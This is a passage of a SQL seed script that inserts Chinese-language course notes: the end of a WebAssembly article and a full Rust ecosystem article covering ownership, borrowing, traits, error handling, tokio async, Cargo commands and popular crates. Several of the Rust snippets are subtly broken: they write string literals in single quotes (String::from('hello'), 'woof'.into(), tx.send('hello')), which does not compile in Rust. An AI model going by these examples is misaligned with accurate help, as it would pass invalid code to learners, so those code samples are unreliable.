- **Exception Handling**：原生异常。
- **DOM 访问**：仍需 JS 桥接。

## 九、典型项目
- Figma：C++→Wasm，前端架构大改。
- Photoshop Web：复用桌面算法。
- ffvm/ffmpeg.wasm：浏览器视频处理。
- Squoosh：Google 图像压缩。

## 小结
Wasm 给 Web 带来原生性能，让 C++/Rust 库复用到浏览器；用于计算密集、跨端复用、边缘计算场景；Rust+wasm-bindgen 是当前最佳组合。
$md$,
'前沿技术', 'WebAssembly', array['WebAssembly','Wasm','Rust','前端'], 'seedling', '课程笔记', 4),

('Rust 生态：所有权、async 与生态图谱', 'rust-ecosystem-ownership-async',
 'Rust 的杀手锏是所有权语义：零成本内存安全 + 高性能 + 优秀工具链。',
 $md$# Rust 生态

## 一、所有权三原则
1. 每个值有唯一所有者。
2. 所有者离开作用域时值被销毁。
3. 一份值同时只能有一个所有者，赋值是 move（除非 Copy）。

```rust
let s1 = String::from('hello');
let s2 = s1;                  // s1 move 给 s2，s1 失效
// println!("{}", s1);       // 编译错误
let s3 = s2.clone();          // 深拷贝
```

## 二、借用与生命周期
- **不可变借用 `&T`**：可同时多个。
- **可变借用 `&mut T`**：唯一，不能与不可变借用共存。
- **生命周期 `'a`**：编译期保证引用不会悬空。

```rust
fn longest<'a>(a: &'a str, b: &'a str) -> &'a str {
    if a.len() > b.len() { a } else { b }
}
```

## 三、Trait 与泛型
- Trait = 接口 + 默认实现。
- 静态分发（单态化）vs 动态分发（dyn Trait）。
- 派生 Trait：`#[derive(Debug, Clone, PartialEq)]`。

```rust
trait Greet { fn hello(&self) -> String; }
struct Dog;
impl Greet for Dog { fn hello(&self) -> String { 'woof'.into() } }
fn print_greet(g: &impl Greet) { println!("{}", g.hello()); }
```

## 四、错误处理
- `Result<T, E>`：可恢复错误。
- `Option<T>`：可能不存在。
- `?` 操作符：错误传播。
- `thiserror` / `anyhow`：库自定义错误。

```rust
fn read_config(path: &str) -> Result<Config, std::io::Error> {
    let s = std::fs::read_to_string(path)?;
    Ok(parse(&s))
}
```

## 五、Async 异步
- `async fn` 返回 `impl Future`。
- 运行时：tokio（主流）/ async-std。
- 零成本：编译为状态机，无线程切换。

```rust
use tokio;
#[tokio::main]
async fn main() {
    let (tx, mut rx) = tokio::sync::mpsc::channel(10);
    tokio::spawn(async move {
        tx.send('hello').await.unwrap();
    });
    println!("got: {}", rx.recv().await.unwrap());
}
```

## 六、Cargo 工具链
```bash
cargo new myapp && cd myapp
cargo build --release         # 编译优化
cargo run                      # 跑
cargo test                    # 测试
cargo fmt                     # 格式化
cargo clippy                  # lint
cargo bench                    # 性能基准
cargo flamegraph              # 火焰图
```

## 七、生态图谱
| 领域 | 代表 crate |
|---|---|
| Web | axum / actix-web / rocket |
| 异步运行时 | tokio |
| 序列化 | serde / serde_json |
| DB | sqlx / diesel / sea-orm |
| HTTP 客户端 | reqwest |
| 命令行 | clap / crossterm |
| 并发 | rayon / crossbeam |
| 加密 | ring / aes-gcm |
| 日志 | tracing / env_logger |

## 八、典型项目
- ripgrep、fd、bat、exa：CLI 工具标杆。
- deno：JS 运行时。
- Tauri：用 Rust 写桌面应用（替代 Electron）。
- ruff：Python lint 重写（比 flake8 快 100x）。

## 九、学习路径
1. 《The Rust Programming Language》（官方书）。
2. Rustlings 动手练习。
3. Rust by Example。
4. 做小项目：CLI 工具、Web 服务、Wasm 组件。

## 小结
Rust 用所有权+借用让内存安全零成本；async + tokio 高并发；Cargo 工具链覆盖全流程；生态从 CLI 到 Web 到系统，已是替代 C++ 的现代选择。
$md$,
'前沿技术', 'Rust 生态', array['Rust','所有权','async','tokio'], 'seedling', '课程笔记', 4)

on conflict (slug) do nothing;
